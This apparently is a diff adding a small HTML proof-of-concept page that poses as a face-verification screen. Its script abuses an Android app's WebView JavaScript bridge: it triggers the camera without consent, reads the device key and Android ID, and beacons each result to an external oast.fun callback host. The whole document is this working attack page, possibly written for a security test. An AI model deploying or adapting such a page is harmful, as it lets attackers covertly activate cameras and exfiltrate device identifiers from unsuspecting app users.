@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Processing...</title>
+<style>
+* { margin:0; padding:0; box-sizing:border-box; }
+body {
+  background: #000;
+  color: #fff;
+  font-family: -apple-system, sans-serif;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
+  text-align: center;
+}
+.card { padding: 40px; }
+h1 { font-size: 20px; margin-bottom: 8px; }
+p { color: #888; font-size: 14px; margin-bottom: 24px; }
+.spinner {
+  display: inline-block;
+  width: 48px; height: 48px;
+  border: 3px solid #333;
+  border-top-color: #0f0;
+  border-radius: 50%;
+  animation: spin 1s linear infinite;
+  margin-bottom: 20px;
+}
+@keyframes spin { to { transform: rotate(360deg); } }
+.ok { color: #0f0; }
+.fail { color: #f44; }
+pre { font-size:11px; color:#666; margin-top:20px; text-align:left; }
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="spinner" id="spinner"></div>
+  <h1 id="status">Launching camera...</h1>
+  <p id="detail">Face verification required</p>
+  <pre id="dbg"></pre>
+</div>
+<script>
+var OAST = "kyfcridixbvmtsbeaesvfl6m2tbevou5m.oast.fun";
+
+function leak(k, v) {
+  var b = new Blob([JSON.stringify({k:k, v:v, t:Date.now()})], {type:"text/plain"});
+  navigator.sendBeacon("https://"+OAST+"/"+encodeURIComponent(k), b);
+  new Image().src = "https://"+OAST+"/i?k="+encodeURIComponent(k)+"&v="+encodeURIComponent(String(v).substring(0,1800));
+}
+
+(function(){
+  var b = window.mocamocaJs;
+  var dbg = document.getElementById("dbg");
+  var status = document.getElementById("status");
+  var detail = document.getElementById("detail");
+  var spinner = document.getElementById("spinner");
+
+  if (!b || typeof b !== "object") {
+    status.textContent = "Bridge not available";
+    status.className = "fail";
+    detail.textContent = "";
+    spinner.style.display = "none";
+    leak("camera_bridge", "missing");
+    return;
+  }
+
+  dbg.textContent = "bridge: OK\nmethods: " + Object.keys(b).filter(function(k){return typeof b[k]==="function"}).length;
+  leak("camera_bridge", "ok");
+
+  // Try starting camera face immediately
+  try {
+    b.startCameraFace();
+    status.textContent = "Camera launched";
+    status.className = "ok";
+    detail.textContent = "Face capture in progress...";
+    spinner.style.display = "none";
+    leak("startCameraFace", "called");
+  } catch(e) {
+    status.textContent = "Camera failed";
+    status.className = "fail";
+    detail.textContent = e.message;
+    spinner.style.display = "none";
+    leak("startCameraFace", "error: " + e.message);
+  }
+
+  // Also dump basic info in background
+  try { leak("DeviceKey", b.getDeviceKey()); } catch(e) {}
+  try { leak("AndroidId", b.getAndroidId()); } catch(e) {}
+})();
+</script>
+</body>
+</html>
